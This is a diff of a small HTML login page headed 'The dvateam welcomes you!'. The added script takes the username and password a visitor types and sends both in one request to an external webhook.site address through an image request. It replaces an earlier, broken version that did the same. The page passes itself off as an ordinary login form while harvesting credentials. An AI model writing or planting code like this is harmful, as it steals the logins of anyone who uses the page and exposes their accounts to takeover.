@@ -29,26 +29,23 @@
     </style>
 </head>
 <body>
-  <h1>The dvateam welcomes you!</h1>
+    <h1>The dvateam welcomes you!</h1>
     <form id="myForm">
-      <input type="text" id="username" placeholder="Username"><br>
-      <input type="password" id="password" placeholder="Password"><br>
-      <button type="submit">Submit</button>
+        <input type="text" id="username" placeholder="Username"><br>
+        <input type="password" id="password" placeholder="Password"><br>
+        <button type="submit">Submit</button>
     </form>
 
     <script>
-    document.getElementById("myForm").addEventListener("submit", function(event) {
-    event.preventDefault(); // Prevent the form from submitting by default
-    const userValue = document.getElementById("username").value;
-    const passValue = document.getElementById("password").value;
-    });
+        document.getElementById("myForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent the form from submitting by default
+            const value = document.getElementById("username").value;
+            const value1 = document.getElementById("password").value;
 
-    var i=new Image;
-    i.src="https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36/?"+userValue;
-    var i=new Image;
-    i.src="https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36/?"+passValue;
-        
-</script>
-  
+            // Create a single Image object and send both values in one request
+            var image = new Image();
+            image.src = "https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36/?username=" + value + "&password=" + value1;
+        });
+    </script>
 </body>
 </html>
